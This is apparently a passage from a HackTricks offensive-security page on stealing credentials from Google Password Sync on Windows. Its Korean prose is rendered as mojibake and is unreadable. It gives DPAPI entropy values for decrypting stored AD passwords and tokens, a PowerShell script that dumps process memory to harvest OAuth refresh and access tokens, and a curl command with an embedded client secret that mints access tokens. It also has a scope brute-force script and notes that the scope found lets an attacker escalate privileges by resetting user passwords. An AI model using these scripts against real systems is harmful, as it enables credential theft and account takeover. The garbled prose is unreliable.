ì•”í˜¸í™”ëœ **ë¹„ë°€ë²ˆí˜¸**(ìˆëŠ” ê²½ìš°)ëŠ” **`ADPassword`** í‚¤ ë‚´ì— ìˆìœ¼ë©°, **`CryptProtectData`** APIë¥¼ ì‚¬ìš©í•˜ì—¬ ì•”í˜¸í™”ë©ë‹ˆë‹¤. ì´ë¥¼ ë³µí˜¸í™”í•˜ë ¤ë©´ ë¹„ë°€ë²ˆí˜¸ ë™ê¸°í™”ë¥¼ êµ¬ì„±í•œ ì‚¬ìš©ìì™€ ë™ì¼í•œ ì‚¬ìš©ìì—¬ì•¼ í•˜ë©°, **`CryptUnprotectData`**ë¥¼ ì‚¬ìš©í•  ë•Œ ì´ **ì—”íŠ¸ë¡œí”¼**ë¥¼ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤: `byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };`

ì•”í˜¸í™”ëœ í† í°(ìˆëŠ” ê²½ìš°)ì€ **`AuthToken`** í‚¤ ë‚´ì— ìˆìœ¼ë©°, **`CryptProtectData`** APIë¥¼ ì‚¬ìš©í•˜ì—¬ ì•”í˜¸í™”ë©ë‹ˆë‹¤. ì´ë¥¼ ë³µí˜¸í™”í•˜ë ¤ë©´ ë¹„ë°€ë²ˆí˜¸ ë™ê¸°í™”ë¥¼ êµ¬ì„±í•œ ì‚¬ìš©ìì™€ ë™ì¼í•œ ì‚¬ìš©ìì—¬ì•¼ í•˜ë©°, **`CryptUnprotectData`**ë¥¼ ì‚¬ìš©í•  ë•Œ ì´ **ì—”íŠ¸ë¡œí”¼**ë¥¼ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤: `byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };`\
ë˜í•œ, **`0123456789abcdefghijklmnopqrstv`** ì‚¬ì „ì„ ì‚¬ìš©í•˜ì—¬ base32hexë¡œ ì¸ì½”ë”©ë©ë‹ˆë‹¤.

ì—”íŠ¸ë¡œí”¼ ê°’ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ ë„êµ¬ëŠ” **`CryptUnprotectData`** ë° **`CryptProtectData`** í˜¸ì¶œì„ ëª¨ë‹ˆí„°ë§í•˜ë„ë¡ êµ¬ì„±ë˜ì—ˆìœ¼ë©°, ê·¸ëŸ° ë‹¤ìŒ `PasswordSync.exe`ë¥¼ ì‹¤í–‰í•˜ê³  ëª¨ë‹ˆí„°ë§í•˜ëŠ” ë° ì‚¬ìš©ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ ë„êµ¬ëŠ” êµ¬ì„±ëœ ë¹„ë°€ë²ˆí˜¸ì™€ ì¸ì¦ í† í°ì„ ì²˜ìŒì— ë³µí˜¸í™”í•˜ê³ , ë‘ ê²½ìš° ëª¨ë‘ **ì‚¬ìš©ëœ ì—”íŠ¸ë¡œí”¼ì˜ ê°’ì„ ë³´ì—¬ì¤ë‹ˆë‹¤**:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5782633230648853886-y.jpg" alt=""><figcaption></figcaption></figure>

ì´ API í˜¸ì¶œì˜ ì…ë ¥ ë˜ëŠ” ì¶œë ¥ì—ì„œ **ë³µí˜¸í™”ëœ** ê°’ì„ ë³¼ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤(Winpeasê°€ ì‘ë™ì„ ë©ˆì¶˜ ê²½ìš°).

ë¹„ë°€ë²ˆí˜¸ ë™ê¸°í™”ê°€ **SA ìê²© ì¦ëª…ìœ¼ë¡œ êµ¬ì„±ëœ ê²½ìš°**, ë ˆì§€ìŠ¤íŠ¸ë¦¬ **`HKLM\Software\Google\Google Apps Password Sync`** ë‚´ì˜ í‚¤ì— ì €ì¥ë©ë‹ˆë‹¤.

### GPS - ë©”ëª¨ë¦¬ì—ì„œ í† í° ë¤í”„

GCPWì™€ ë§ˆì°¬ê°€ì§€ë¡œ `PasswordSync.exe` ë° `password_sync_service.exe` í”„ë¡œì„¸ìŠ¤ì˜ ë©”ëª¨ë¦¬ë¥¼ ë¤í”„í•  ìˆ˜ ìˆìœ¼ë©°, ë¦¬í”„ë ˆì‹œ ë° ì•¡ì„¸ìŠ¤ í† í°ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤(ì´ë¯¸ ìƒì„±ëœ ê²½ìš°).\
AD êµ¬ì„±ëœ ìê²© ì¦ëª…ë„ ì°¾ì„ ìˆ˜ ìˆì„ ê²ƒì…ë‹ˆë‹¤.

<details>

<summary>ë¤í”„ <code>PasswordSync.exe</code> ë° <code>password_sync_service.exe</code> í”„ë¡œì„¸ìŠ¤ ë° í† í° ê²€ìƒ‰</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$processNames = @("PasswordSync", "password_sync_service")
$chromeProcesses = Get-Process | Where-Object { $processNames -contains $_.Name } | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}
```
</details>

### GPS - ë¦¬í”„ë ˆì‹œ í† í°ìœ¼ë¡œ ì•¡ì„¸ìŠ¤ í† í° ìƒì„±

ë¦¬í”„ë ˆì‹œ í† í°ì„ ì‚¬ìš©í•˜ì—¬ ë‹¤ìŒ ëª…ë ¹ì— ì§€ì •ëœ í´ë¼ì´ì–¸íŠ¸ IDì™€ í´ë¼ì´ì–¸íŠ¸ ë¹„ë°€ì„ ì‚¬ìš©í•˜ì—¬ ì•¡ì„¸ìŠ¤ í† í°ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
https://www.googleapis.com/oauth2/v4/token
```
### GPS - Scopes

{% hint style="info" %}
ë¦¬í”„ë ˆì‹œ í† í°ì´ ìˆë”ë¼ë„, ì•¡ì„¸ìŠ¤ í† í°ì„ ìƒì„±í•˜ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì§€ì›í•˜ëŠ” **ìŠ¤ì½”í”„ë§Œ ìš”ì²­í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì—** ì•¡ì„¸ìŠ¤ í† í°ì— ëŒ€í•œ ìŠ¤ì½”í”„ë¥¼ ìš”ì²­í•˜ëŠ” ê²ƒì€ ë¶ˆê°€ëŠ¥í•©ë‹ˆë‹¤.

ë˜í•œ, ë¦¬í”„ë ˆì‹œ í† í°ì€ ëª¨ë“  ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ìœ íš¨í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
{% endhint %}

ê¸°ë³¸ì ìœ¼ë¡œ GPSëŠ” ì‚¬ìš©ìê°€ ëª¨ë“  ê°€ëŠ¥í•œ OAuth ìŠ¤ì½”í”„ì— ì ‘ê·¼í•  ìˆ˜ ì—†ìœ¼ë¯€ë¡œ, ë‹¤ìŒ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ `refresh_token`ìœ¼ë¡œ `access_token`ì„ ìƒì„±í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ìŠ¤ì½”í”„ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

ê·¸ë¦¬ê³  ì´ê²ƒì€ ì œê°€ ì‘ì„± ë‹¹ì‹œ ë°›ì€ ì¶œë ¥ì…ë‹ˆë‹¤:
```
https://www.googleapis.com/auth/admin.directory.user
```
ì–´ë–¤ ë²”ìœ„ë¥¼ ì§€ì •í•˜ì§€ ì•Šìœ¼ë©´ ì–»ëŠ” ê²ƒê³¼ ë™ì¼í•©ë‹ˆë‹¤.

{% hint style="danger" %}
ì´ ë²”ìœ„ë¡œ **ê¸°ì¡´ ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ìˆ˜ì •í•˜ì—¬ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.
{% endhint %}

## References

* [https://www.youtube.com/watch?v=FEQxHRRP\_5I](https://www.youtube.com/watch?v=FEQxHRRP\_5I)
* [https://issues.chromium.org/issues/40063291](https://issues.chromium.org/issues/40063291)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
